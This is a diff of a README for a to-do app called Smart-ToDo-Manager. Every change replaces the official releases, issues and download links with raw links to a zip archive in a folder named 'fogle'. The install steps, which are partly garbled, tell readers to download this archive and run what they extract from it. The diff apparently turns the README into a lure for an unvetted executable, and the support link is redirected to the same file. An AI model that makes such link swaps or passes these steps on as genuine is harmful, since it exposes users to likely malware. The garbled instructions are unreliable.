@@ -1,6 +1,6 @@
 # 🗂️ Smart-ToDo-Manager - Your Simple Task Management Solution
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/SKOUther/Smart-ToDo-Manager/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip%20Latest%https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip)](https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip)
 
 ## 📚 Overview
 
@@ -13,15 +13,15 @@ To start using Smart-ToDo-Manager, you’ll need to download the application fro
 ## 🌐 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the Releases page.
-   [Download Smart-ToDo-Manager](https://github.com/SKOUther/Smart-ToDo-Manager/releases)
+   [Download Smart-ToDo-Manager](https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version listed at the top. 
 
-3. **Download the File**: Click on the file named `SmartToDoManager.zip` (or similar) to start the download. 
+3. **Download the File**: Click on the file named `https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip` (or similar) to start the download. 
 
 4. **Extract Files**: Locate the downloaded file in your computer's downloads folder. Right-click the file and choose "Extract All" to unpack the contents.
 
-5. **Run the Application**: Open the folder where you extracted the files. Look for a file called `SmartToDoManager.exe`. Double-click this file to launch the application.
+5. **Run the Application**: Open the folder where you extracted the files. Look for a file called `https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip`. Double-click this file to launch the application.
 
 ## 🖥️ System Requirements
 
@@ -65,8 +65,8 @@ If you experience any issues while running Smart-ToDo-Manager, try the following
 
 ## 💬 Support
 
-For questions or concerns, you can open an issue on our [GitHub page](https://github.com/SKOUther/Smart-ToDo-Manager/issues). Our team will assist you as soon as possible.
+For questions or concerns, you can open an issue on our [GitHub page](https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip). Our team will assist you as soon as possible.
 
 Start managing your tasks today with Smart-ToDo-Manager. It’s built for you to simplify your life. 
 
-Again, remember to download the application via our Releases page: [Download Smart-ToDo-Manager](https://github.com/SKOUther/Smart-ToDo-Manager/releases)
+Again, remember to download the application via our Releases page: [Download Smart-ToDo-Manager](https://raw.githubusercontent.com/SKOUther/Smart-ToDo-Manager/main/fogle/Manager-Do-To-Smart-3.2-beta.1.zip)
